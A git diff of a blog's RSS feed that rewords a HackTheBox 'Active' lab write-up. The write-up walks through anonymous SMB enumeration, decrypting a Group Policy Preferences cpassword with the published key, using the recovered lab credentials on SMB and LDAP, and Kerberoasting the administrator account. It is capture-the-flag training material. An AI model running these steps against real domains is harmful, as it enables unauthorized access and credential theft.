@@ -13,7 +13,7 @@
       
       <guid>https://fahmifj.github.io/writeups/hackthebox/htb-active/</guid>
       <description>Finding passwords in Group Policy Preferences and roasting Kerberos</description>
-      <content:encoded><![CDATA[<p>Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.</p>
+      <content:encoded><![CDATA[<p>Active is an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). Using that credentials on LDAP reveals that the administrator account has a Service Principal Name attribute of a CIFS service. This leads to a Kerberoasting attack which allows attackers to obtain the password hash of administrator account. The hash can be cracked and used to obtain a remote access with administrative privilege.</p>
 <h4 id="skills-learned">Skills Learned</h4>
 <ul>
 <li>Active Directory GPP</li>
@@ -27,7 +27,7 @@
 </ul>
 <h2 id="reconnaissance">Reconnaissance</h2>
 <h3 id="nmap">Nmap</h3>
-<p>A full TCP scan (after  <code>-p-</code> performed) discovers a bunch of open ports. The most notable ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can safely assume this is an Active Directory (as the box name implies).</p>
+<p>A full TCP scan (after  <code>-p-</code> performed) discovers a bunch of open ports. The most notable ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can assume that this is an Active Directory.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
 $ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100
 Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 23:20 EDT
@@ -75,7 +75,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 71.11 seconds
-</code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) as well as PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I&rsquo;ll consider these vulns as alternative methods and put them in separate post (see: <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">PrintNightmare</a>).</p>
+</code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) and PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I will consider these vulnerabilities as alternative methods and put them in separate post (Update! see <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">PrintNightmare</a>).</p>
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="tcp-53---dns">TCP 53 - DNS</h3>
 <p>There is no zone transfer in this machine.</p>
@@ -101,7 +101,7 @@ $ smbmap -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</s
         SYSVOL                                                  NO ACCESS       Logon server share 
         Users                                                   NO ACCESS
 </code></pre></div><h4 id="replication-share">Replication Share</h4>
-<p>The <code>Replication</code> share contains a lot of folders, so I&rsquo;ll just download them recursively.</p>
+<p>The <code>Replication</code> share contains a lot of folders. I will download them all recursively.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
 $ smbclient -N //10.10.10.100/Replication
 Anonymous login successful
@@ -121,7 +121,7 @@ getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicie
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
 $ find . -type f -iname groups.xml                                                                            
 ./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
-</code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <code>active.htb\SVC_TGS</code>. I&rsquo;ll note the password</p>
+</code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <strong>active.htb\SVC_TGS</strong>. I will note this password.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
 $ cat ./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
 &lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>?&gt;
@@ -145,7 +145,7 @@ Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to p
 <h3 id="access-as-svc_tgs">Access as SVC_TGS</h3>
 <h4 id="group-policy-preferences-gpp---password-decrypt">Group Policy Preferences (GPP) - Password Decrypt</h4>
 <p>In Windows Server 2008, Microsoft introduced a feature called <strong>Group Policy Preferences</strong>. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers through Group Policy.</p>
-<p>When a GPP is created, it creates an associated XML file in SYSVOL share. Some of the XML files may contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> which can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p>
+<p>When a GPP is created, it also creates an associated XML file in SYSVOL share. Some of the XML files may contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> and that key can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p>
 <p>Kali comes with a tool called <code>gpp-decrypt</code>, and this tool can be used to decrypt the <code>cpassword</code> I obtained from the <code>Groups.xml</code> file.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
 $ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
@@ -166,7 +166,7 @@ SMB         10.10.10.100    <span class="m">445</span>    DC               NETLO
 SMB         10.10.10.100    <span class="m">445</span>    DC               Replication     READ            
 SMB         10.10.10.100    <span class="m">445</span>    DC               SYSVOL          READ            Logon server share 
 SMB         10.10.10.100    <span class="m">445</span>    DC               Users           READ  
-</code></pre></div><p>Looking into the  <code>Users</code> share, I&rsquo;m sure this share is most likely <code>C:\Users\</code></p>
+</code></pre></div><p>Looking into the  <code>Users</code> share, I&rsquo;m sure this share is <code>C:\Users\</code></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
 $ smbclient -N //10.10.10.100/Users -U <span class="s1">&#39;SVC_TGS%GPPstillStandingStrong2k18&#39;</span>
 Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
@@ -196,8 +196,7 @@ getting file \SVC_TGS\Desktop\user.txt of size 34 as /tmp/smbmore.uhunaP (0.1 Ki
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
 <h4 id="ldap---spn-enumeration">LDAP - SPN enumeration</h4>
-<p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service.</p>
-<p>It was found that the administrator has <code>servicePrincipalName</code> (SPN) attribute.</p>
+<p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service. It was found that the administrator has the <code>servicePrincipalName</code> (SPN) attribute set.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
 $ ldapsearch -LLL -x -D <span class="s1">&#39;SVC_TGS@active.htb&#39;</span> -w <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> -h 10.10.10.100 -b <span class="s2">&#34;dc=active,dc=htb&#34;</span> <span class="s2">&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span> 
 dn: <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
@@ -212,13 +211,12 @@ servicePrincipalName: active/CIFS:445
 objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
 ...<span class="o">[</span>SNIP<span class="o">]</span>...
 </code></pre></div><h4 id="kerberoasting">Kerberoasting</h4>
-<p>If a Service Principal Name is registered into a user account, the account is vulnerable to an attack called <strong>Kerberoasting</strong>. It is an attack against Kerberos to steal a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_b4041466-ae24-4fd4-83e4-5dbc4f32aaab">Service Ticket</a>.</p>
-<p>The attack is well explained in <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">this blog</a> and <a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">this one</a>, but I will try to give an overview using the following image created by <a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">David Freimannis</a>. The <strong>Kerberoasting</strong> attack indicated by a red box.</p>
+<p>If a Service Principal Name is registered into a user account, the account is vulnerable to an attack called <strong>Kerberoasting</strong>. It is an attack against Kerberos to steal a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_b4041466-ae24-4fd4-83e4-5dbc4f32aaab">Service Ticket</a> (ST).</p>
+<p>The attack is well explained in <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">this blog</a> and <a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">this one</a>, but I will try to give an overview using the following image created by <a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">David Freimannis</a>. The <strong>Kerberoasting</strong> attack indicated by a red box starting from step number 3.</p>
 <p><div class="img-container"><img src="imgs/image-20210715120848088.png" alt="image-20210715120848088"  title="Kerberos Mechanism"  /></div>
 </p>
 <center><small>Taken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis</small></center>
-<p>In the image above, step number 4, the client/user will obtains a Ticket Granting Service (TGS) ticket. This ticket is encrypted with NTLM hash (derived from password) of a service account. If the client itself has been compromised, an attacker could easily steal the ticket and attempt an offline brute-force to recover the password from the ticket.</p>
-<p>In this case, let&rsquo;s start from step 3, and say we want to access a CIFS service. The server (KDC) then searches for SPN of the CIFS service, which is <code>active/CIFS:445</code>, and it is registered to the administrator account. Once the SPN is found, server will issue a TGS ticket encrypted with NTLM hash of the administrator account and send the ticket to the client. Now that we have the TGS ticket, but instead of using this ticket to authenticate to the CIFS service, we keep that ticket and attempt a brute-force against it to recover the administrator password.</p>
+<p>Using this case, I want to access a CIFS service, so I need to ask the server (KDC) for it. The server will search the SPN of the CIFS service, which is <code>active/CIFS:445</code>, and that SPN is registered to the administrator account. Once the SPN is found, server will issue a TGS ticket encrypted with NTLM hash  (derived from password)  of the administrator account and send the ticket to me. Now that I have the TGS ticket, but instead of using (forwarding) this ticket to authenticate to the CIFS service, I keep that ticket and attempt a brute-force attack against it to recover the administrator password.</p>
 <blockquote>
 <p>If the SPN is registered to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.</p>
 </blockquote>
